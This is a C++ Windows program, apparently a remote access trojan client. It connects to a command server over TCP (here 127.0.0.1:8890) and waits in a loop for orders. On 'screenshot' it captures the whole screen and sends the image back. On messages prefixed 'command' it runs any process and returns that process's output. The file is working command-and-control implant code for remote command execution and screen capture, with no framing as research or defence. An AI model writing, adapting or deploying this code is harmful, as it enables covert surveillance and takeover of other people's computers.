#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>
#include <wincodec.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024

// Function to capture the screen
bool captureScreen(BYTE** buffer, DWORD* bufferSize) {
    // Create a device context for the entire screen
    HDC hScreenDC = GetDC(NULL);
    int nScreenWidth = GetSystemMetrics(SM_CXSCREEN);
    int nScreenHeight = GetSystemMetrics(SM_CYSCREEN);

    // Create a compatible DC, which is used in a BitBlt from the screen DC
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

    // Create a compatible bitmap from the screen DC
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, nScreenWidth, nScreenHeight);

    // Select the new bitmap into the memory DC
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

    // Bit block transfer into our compatible memory DC
    BitBlt(hMemoryDC, 0, 0, nScreenWidth, nScreenHeight, hScreenDC, 0, 0, SRCCOPY);

    // Get the bitmap bits
    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);
    *bufferSize = bmp.bmWidthBytes * bmp.bmHeight;
    *buffer = new BYTE[*bufferSize];
    GetBitmapBits(hBitmap, *bufferSize, *buffer);

    // Clean up
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);

    return true;
}

// Function to send data over a socket
bool sendData(SOCKET s, const BYTE* data, DWORD dataSize) {
    DWORD bytesSent = 0;
    while (bytesSent < dataSize) {
        DWORD result = send(s, (const char*)(data + bytesSent), dataSize - bytesSent, 0);
        if (result == SOCKET_ERROR) {
            std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
            return false;
        }
        bytesSent += result;
    }
    return true;
}

// Function to execute a system command and capture the output
std::string executeCommand(const std::string& command) {
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    HANDLE hChildStdoutRd, hChildStdoutWr;
    CreatePipe(&hChildStdoutRd, &hChildStdoutWr, &saAttr, 0);
    SetHandleInformation(hChildStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = hChildStdoutWr;
    siStartInfo.hStdOutput = hChildStdoutWr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    std::string result;
    if (CreateProcess(NULL, (LPSTR)command.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &piProcInfo)) {
        CloseHandle(hChildStdoutWr);
        char buffer[4096];
        DWORD bytesRead;
        while (ReadFile(hChildStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead != 0) {
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        CloseHandle(hChildStdoutRd);
        WaitForSingleObject(piProcInfo.hProcess, INFINITE);
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);
    } else {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
    }
    return result;
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed: " << WSAGetLastError() << std::endl;
        return 1;
    }

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        std::cerr << "Socket creation failed: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8890);
    serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

    if (connect(s, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connect failed: " << WSAGetLastError() << std::endl;
        closesocket(s);
        WSACleanup();
        return 1;
    }

    // Send connection request
    std::string connectRequest = "{\"request\":\"connect\",\"listening_port\":13377,\"option\":\"\"}";
    send(s, connectRequest.c_str(), connectRequest.size(), 0);

    char recvBuffer[BUFFER_SIZE];
    while (true) {
        DWORD bytesRead = recv(s, recvBuffer, BUFFER_SIZE, 0);
        if (bytesRead == SOCKET_ERROR || bytesRead == 0) {
            std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
            continue;
        }

        std::string command(recvBuffer, bytesRead);
        std::cout << "Received command: " << command << std::endl;

        if (command == "screenshot") {
            BYTE* screenshotData;
            DWORD screenshotSize;
            if (captureScreen(&screenshotData, &screenshotSize)) {
                sendData(s, screenshotData, screenshotSize);
                delete[] screenshotData;
            } else {
                std::string errorMessage = "Failed to capture screen";
                send(s, errorMessage.c_str(), errorMessage.size(), 0);
            }
        } else if (command.find("command") == 0) {
            std::string cmd = command.substr(7);
            std::string result = executeCommand(cmd);
            send(s, result.c_str(), result.size(), 0);
        }
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
